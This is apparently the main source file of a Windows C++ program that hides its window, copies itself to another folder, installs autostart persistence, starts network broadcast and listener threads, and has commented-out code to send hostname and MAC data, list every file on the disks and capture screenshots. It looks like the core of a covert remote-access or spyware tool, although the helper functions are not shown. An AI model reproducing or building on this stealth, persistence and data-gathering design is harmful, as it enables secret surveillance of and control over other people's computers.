// Http.cpp : Defines the entry point for the console application.
//

#include "Tools.h"
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
#include "broadcast.h"

void ListenBroser();
bool ReceiveThreadIsCreated=false;

int main(int argc, char* argv[])
//int WINAPI WinMain(  
//                   HINSTANCE hInstance,       // handle to current instance  
//                   HINSTANCE hPrevInstance,      // handle to previous instance  
//                   LPSTR lpCmdLine,           // command line  
//                   int nCmdShow                    // show state  
//                   )  
{

	/*string str="test:\"abc'nl'nn\"";
	string s=ExtractStr(str,"test","\"","'nn");
	cout<<s<<endl;*/
	//printf("%s\n",Tools::GetDate(buff));
//	postString = postString +  (LPSTR)(LPCTSTR)"hostname=" +(LPSTR)(LPCTSTR)chBuf + (LPSTR)(LPCTSTR)"&mac=" + (LPSTR)(LPCTSTR)buffEncode + (LPSTR)(LPCTSTR)"&key=" + (LPSTR)(LPCTSTR)Tools::NowDate();// + ;// + "&ipc=" + Connect.GetIP();
	//uriString = uriString + "?" + postString;
	//StartThreadImageCast();
	
	
if(!CopyToDestDir())
	{
		
		InstallAutostart();
		StartThreadSendBroadCast();
		StartThreadRecvBroadCast();
//		StartReceiveFileThread();
		ListenBroser();


	}
//	FormatQuery();
/*	vector<string> vs=GetComputerDisk();//ListFile("c:\\");
	for(vector<string>::iterator it  = vs.begin(); it != vs.end(); ++it)  
        { 
                 cout<<*(it)<<endl;  
				 vector<string> vs1=ListFile(*(it));
				 	for(vector<string>::iterator it1  = vs1.begin(); it1 != vs1.end(); ++it1)  
					{ 
						cout<<"\t"<<*(it1)<<endl;
					}
        }  
	string path=Tools::GetNowPath(".jpg");
	cout<<path<<endl;
	CastImage("D:\\1.jpg");
	/*
	ghBitmap = ScreenCapture("D:\\x.bmp", 32, NULL);
	CImage image;
	
	image.Load(_T("D:\\x.bmp"));
	image.Save(_T("D:\\x.jpg"));
	
	return 0;
	*/
	//system("pause");
	}



